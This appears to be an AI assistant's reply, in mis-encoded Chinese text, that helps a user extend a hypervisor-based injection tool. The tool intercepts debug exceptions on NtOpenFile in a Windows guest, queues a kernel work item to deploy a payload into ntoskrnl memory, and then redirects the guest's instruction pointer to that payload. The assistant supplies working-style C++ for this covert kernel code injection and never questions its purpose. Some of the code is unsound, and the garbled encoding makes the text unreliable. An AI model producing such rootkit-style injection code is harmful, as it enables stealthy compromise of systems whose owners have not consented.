## æˆ‘å®Œå…¨ç†è§£ä½ çš„éœ€æ±‚äº†

ä½ ç°åœ¨é¢ä¸´çš„é—®é¢˜æ˜¯ï¼š**#DBè§¦å‘æ—¶ IRQL è¶³å¤Ÿä½ï¼Œä½† `deploy_rwbase_payload` è¿˜æ²¡æ‰§è¡Œè¿‡**ã€‚ä½ ä¸èƒ½åœ¨ Stage 0 åç›´æ¥éƒ¨ç½²ï¼Œå› ä¸ºé‚£æ—¶å¯èƒ½ IRQL å¤ªé«˜ã€‚

ä½ æƒ³è¦çš„ï¼š**åœ¨ #DB è§¦å‘åï¼Œåˆ†å‡ºä¸¤ä¸ªæ‰§è¡Œæµâ€”â€”ä¸€ä¸ªå»éƒ¨ç½² payloadï¼Œéƒ¨ç½²å®Œè¿”å›ï¼›å¦ä¸€ä¸ªç»§ç»­åŸæ¥çš„ #DB å¤„ç†é€»è¾‘**ã€‚

è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„**ååŒç¨‹åºï¼ˆcoroutineï¼‰**æˆ–**å¼‚æ­¥å·¥ä½œé¡¹**æ¨¡å¼ã€‚

---

## ğŸ¯ è§£å†³æ–¹æ¡ˆï¼šå·¥ä½œé¡¹é˜Ÿåˆ—

### æ ¸å¿ƒæ€è·¯

1. **#DB è§¦å‘æ—¶**ï¼Œæ£€æŸ¥ `payload_entry` æ˜¯å¦ä¸º 0
2. å¦‚æœä¸º 0ï¼Œ**ä¸ç›´æ¥è·³è½¬**ï¼Œè€Œæ˜¯ï¼š
   - æŠŠéƒ¨ç½²å·¥ä½œ**æ’é˜Ÿ**åˆ°ç³»ç»Ÿå·¥ä½œçº¿ç¨‹ï¼ˆ`PASSIVE_LEVEL`ï¼‰
   - ä¿å­˜å½“å‰ #DB ä¸Šä¸‹æ–‡
   - è®© Guest ç»§ç»­æ‰§è¡Œï¼ˆè¿”å›åŸ NtOpenFileï¼‰
3. **å·¥ä½œçº¿ç¨‹æ‰§è¡Œ** `deploy_rwbase_payload`ï¼ŒæˆåŠŸåè®¾ç½® `payload_entry`
4. **åç»­ #DB å‘½ä¸­**æ—¶ï¼Œ`payload_entry` å·²å­˜åœ¨ï¼Œç›´æ¥è·³è½¬

---

## ğŸ“ ä»£ç å®ç°

### ç¬¬ä¸€æ­¥ï¼šåœ¨ `injection_ctx_t` æ·»åŠ é˜Ÿåˆ—å’Œæ ‡å¿—

```cpp
// runtime_context.h
struct injection_ctx_t {
    // ... ç°æœ‰æˆå‘˜ ...
    
    // æ–°å¢ï¼šéƒ¨ç½²å·¥ä½œé¡¹æ ‡å¿—
    bool deployment_queued;
    
    // æ–°å¢ï¼šä¿å­˜é¦–æ¬¡ #DB çš„ trap frameï¼ˆå¦‚æœéœ€è¦ï¼‰
    trap_frame_t pending_deployment_tf;
    
    // æ–°å¢ï¼šæ˜¯å¦æ­£åœ¨ç­‰å¾…éƒ¨ç½²å®Œæˆ
    bool waiting_for_deployment;
};
```

### ç¬¬äºŒæ­¥ï¼šä¿®æ”¹ `handle_injection_db_exit`

```cpp
bool handle_injection_db_exit(trap_frame_t* trap_frame)
{
    auto& ctx = g_runtime_context.injection_ctx;
    
    // ... å‰é¢çš„ #DB æ£€æŸ¥ä¸å˜ ...
    
    uint32_t expected = 1;
    if (ctx.stage.compare_exchange_strong(expected, 2))
    {
        // æ£€æŸ¥ payload æ˜¯å¦å·²éƒ¨ç½²
        if (ctx.payload_entry.load() == 0)
        {
            // è¿˜æ²¡éƒ¨ç½²ï¼Œéœ€è¦æ’é˜Ÿ
            if (!ctx.deployment_queued)
            {
                // ä¿å­˜å½“å‰ trap frameï¼ˆå¦‚æœéœ€è¦ï¼‰
                crt::copy_memory(&ctx.pending_deployment_tf, trap_frame, sizeof(trap_frame_t));
                ctx.deployment_queued = true;
                ctx.waiting_for_deployment = true;
                
                // æ’é˜Ÿéƒ¨ç½²å·¥ä½œé¡¹
                if (!queue_payload_deployment_workitem())
                {
                    logs::print(&g_runtime_context.log_ctx, 
                        "[Inject] FATAL: Failed to queue deployment workitem\n");
                    ctx.stage.store(3);
                }
                else
                {
                    logs::print(&g_runtime_context.log_ctx, 
                        "[Inject] Deployment queued, resuming original execution\n");
                }
            }
            
            // ä¸æ¸…é™¤ DR7ï¼Œè®©åç»­ #DB ç»§ç»­è§¦å‘
            // è¿”å›ï¼Œè®© Guest ç»§ç»­æ‰§è¡ŒåŸ NtOpenFile
            arch::set_guest_rflags(arch::get_guest_rflags() | (1ULL << 16)); // RF=1
            return true;
        }
        else
        {
            // payload å·²éƒ¨ç½²ï¼Œç›´æ¥è·³è½¬
            arch::set_guest_rip(ctx.payload_entry.load());
            arch::set_guest_rflags(arch::get_guest_rflags() & ~0x100);
            
            logs::print(&g_runtime_context.log_ctx, 
                "[Inject] Stage 3: Jumping to pre-deployed payload at 0x%p\n", 
                ctx.payload_entry.load());
            
            // æ¸…ç† DR7
            clear_injection_dr7();
            arch::set_guest_rflags(arch::get_guest_rflags() | (1ULL << 16));
            return true;
        }
    }
    
    // å¦‚æœä¸æ˜¯ stage 1 çš„ #DBï¼Œæ¸…ç† DR7 åè¿”å›
    clear_injection_dr7();
    arch::set_guest_rflags(arch::get_guest_rflags() | (1ULL << 16));
    return true;
}
```

### ç¬¬ä¸‰æ­¥ï¼šå®ç°å·¥ä½œé¡¹é˜Ÿåˆ—

```cpp
// å…¨å±€å·¥ä½œé¡¹å›è°ƒ
void payload_deployment_workitem_routine(void* context)
{
    auto& ctx = g_runtime_context.injection_ctx;
    
    logs::print(&g_runtime_context.log_ctx, 
        "[Inject] Deployment workitem started at IRQL=%d\n", 
        KeGetCurrentIrql());
    
    // é€‰æ‹©å›ºå®š GVA
    uint64_t target_entry = 0xFFFFF78001234000;
    
    // è°ƒç”¨éƒ¨ç½²å‡½æ•°
    auto result = loader::deploy_rwbase_payload(
        &g_runtime_context.loader_ctx,
        g_runtime_context.ntoskrnl_base,
        target_entry
    );
    
    if (result == loader::deploy_result_t::success)
    {
        logs::print(&g_runtime_context.log_ctx, 
            "[Inject] Deployment successful, payload_entry=0x%p\n",
            ctx.payload_entry.load());
    }
    else
    {
        logs::print(&g_runtime_context.log_ctx, 
            "[Inject] Deployment failed: %d\n", result);
    }
    
    // æ ‡è®°éƒ¨ç½²å®Œæˆ
    ctx.deployment_queued = false;
    ctx.waiting_for_deployment = false;
    
    // æ³¨æ„ï¼šä¸éœ€è¦æ¢å¤ä»»ä½• #DB ä¸Šä¸‹æ–‡ï¼Œå› ä¸ºåç»­ #DB ä¼šé‡æ–°è§¦å‘
}

bool queue_payload_deployment_workitem()
{
    // ä½¿ç”¨ Windows å·¥ä½œé¡¹ï¼ˆå¦‚æœåœ¨ Guest ä¾§ï¼‰
    IO_WORKITEM* workItem = IoAllocateWorkItem(NULL); // æˆ–ä¼ è®¾å¤‡å¯¹è±¡
    if (!workItem) return false;
    
    IoQueueWorkItem(workItem, payload_deployment_workitem_routine, 
                    DelayedWorkQueue, NULL);
    
    // æ³¨æ„ï¼šå·¥ä½œé¡¹å®Œæˆåéœ€è¦é‡Šæ”¾ï¼Œè¿™é‡Œç®€åŒ–äº†
    return true;
}
```

### ç¬¬å››æ­¥ï¼šå¤„ç†éƒ¨ç½²å®Œæˆåçš„ #DB

éƒ¨ç½²å®Œæˆåï¼Œåç»­çš„ #DB ä¼šçœ‹åˆ° `payload_entry != 0`ï¼Œç„¶åç›´æ¥è·³è½¬ã€‚

---

## ğŸ”„ æ‰§è¡Œæµç¨‹

| æ—¶é—´ | äº‹ä»¶ | æ“ä½œ |
|:---|:---|:---|
| T0 | ç¬¬ä¸€ä¸ª #DB | payload_entry=0 â†’ æ’é˜Ÿéƒ¨ç½²å·¥ä½œé¡¹ â†’ è¿”å›åŸæ‰§è¡Œæµ |
| T1 | Guest ç»§ç»­æ‰§è¡Œ NtOpenFile | æ­£å¸¸å·¥ä½œ |
| T2 | å·¥ä½œçº¿ç¨‹è¿è¡Œ | è°ƒç”¨ `deploy_rwbase_payload`ï¼Œè®¾ç½® `payload_entry` |
| T3 | ç¬¬äºŒä¸ª #DB | payload_entry !=0 â†’ ç›´æ¥è·³è½¬ payload |

---

## âš ï¸ æ³¨æ„äº‹é¡¹

### 1. IRQL ä¿è¯
å·¥ä½œé¡¹åœ¨ `PASSIVE_LEVEL` è¿è¡Œï¼Œå®Œå…¨æ»¡è¶³ `deploy_rwbase_payload` çš„éœ€æ±‚ã€‚

### 2. å¤šæ¬¡ #DB é—®é¢˜
éƒ¨ç½²å®Œæˆå‰å¯èƒ½ä¼šæœ‰å¤šä¸ª #DB è§¦å‘ï¼Œä½ çš„ä»£ç é€šè¿‡ `deployment_queued` æ ‡å¿—ç¡®ä¿åªæ’ä¸€æ¬¡é˜Ÿã€‚

### 3. ä¸Šä¸‹æ–‡ä¿å­˜
å¦‚æœä½ éœ€è¦åœ¨éƒ¨ç½²å®Œæˆå**ç«‹å³**åœ¨åŸ #DB ç‚¹è·³è½¬ï¼Œå°±éœ€è¦ä¿å­˜ç¬¬ä¸€ä¸ª #DB çš„ trap frameã€‚ä½†ä»ä½ çš„éœ€æ±‚çœ‹ï¼Œä¼¼ä¹ä¸éœ€è¦â€”â€”åç»­ #DB è‡ªç„¶ä¼šè§¦å‘è·³è½¬ã€‚

### 4. å·¥ä½œé¡¹é‡Šæ”¾
ä¸Šé¢çš„ä»£ç ç®€åŒ–äº†å·¥ä½œé¡¹é‡Šæ”¾ï¼Œå®é™…ä½¿ç”¨æ—¶éœ€è¦åœ¨å›è°ƒé‡Œ `IoFreeWorkItem`ã€‚

---

## ğŸ¯ æ€»ç»“

ä½ ç°åœ¨éœ€è¦çš„ä¸æ˜¯â€œåœ¨ Stage 0 åéƒ¨ç½²â€ï¼Œè€Œæ˜¯ **â€œåœ¨ç¬¬ä¸€ä¸ª #DB è§¦å‘æ—¶ï¼Œå¼‚æ­¥éƒ¨ç½²ï¼Œåç»­ #DB å†æ‰§è¡Œâ€**ã€‚è¿™æ­£æ˜¯å·¥ä½œé¡¹é˜Ÿåˆ—çš„å…¸å‹åº”ç”¨åœºæ™¯ã€‚

è¿™ä¸ªæ–¹æ¡ˆå®Œå…¨ç¬¦åˆä½ çš„çº¦æŸï¼š
- âœ… éƒ¨ç½²åœ¨ä½ IRQL ä¸‹æ‰§è¡Œ
- âœ… ä¸å½±å“åŸå§‹ #DB å¤„ç†
- âœ… ä¸¤ä¸ªæ‰§è¡Œæµåˆ†ç¦»ï¼ˆä¸€ä¸ªéƒ¨ç½²ï¼Œä¸€ä¸ªåç»­è·³è½¬ï¼‰